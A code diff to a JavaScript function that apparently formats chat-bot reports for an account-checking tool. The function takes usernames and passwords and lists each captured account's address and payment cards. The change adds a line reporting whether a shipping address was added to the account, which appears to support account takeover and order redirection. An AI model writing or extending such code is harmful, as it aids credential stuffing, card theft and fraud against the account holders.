@@ -166,10 +166,28 @@ function buildCheckAndCaptureResult(result, capture, username, durationMs, passw
       
       const hasAddress = p.postalCode || p.state || p.city;
       const hasCards = p.cards && p.cards.length > 0;
+      const addrInfo = capture.addressAddition;
+      const hasShippingInfo = addrInfo && (addrInfo.success || addrInfo.error);
       
       if (hasAddress) {
         const addr = [p.postalCode, p.state, p.city, p.addressLine1].filter(Boolean).join(' ');
-        parts.push(`${hasCards ? '├' : '└'} Address: ${spoilerCodeV2(addr)}`);
+        const connector = (hasCards || hasShippingInfo) ? '├' : '└';
+        parts.push(`${connector} Address: ${spoilerCodeV2(addr)}`);
+      }
+      
+      // Shipping address addition status
+      if (hasShippingInfo) {
+        let shipLine;
+        if (addrInfo.success && addrInfo.alreadyExisted) {
+          shipLine = `📮 Shipping: already set`;
+        } else if (addrInfo.success) {
+          shipLine = `📮 Shipping: ${codeV2('added')}`;
+        } else {
+          const err = (addrInfo.error || 'unknown').substring(0, 25);
+          shipLine = `📮 Shipping: ${escapeV2('❌ ' + err)}`;
+        }
+        const connector = hasCards ? '├' : '└';
+        parts.push(`${connector} ${shipLine}`);
       }
       
       if (hasCards) {
@@ -184,7 +202,7 @@ function buildCheckAndCaptureResult(result, capture, username, durationMs, passw
           ].filter(Boolean).join(' ');
           parts.push(`${prefix} 💳 ${spoilerCodeV2(cardInfo)}`);
         });
-      } else if (!hasAddress) {
+      } else if (!hasAddress && !hasShippingInfo) {
         const lastIdx = parts.length - 1;
         if (parts[lastIdx].startsWith('├')) {
           parts[lastIdx] = parts[lastIdx].replace('├', '└');
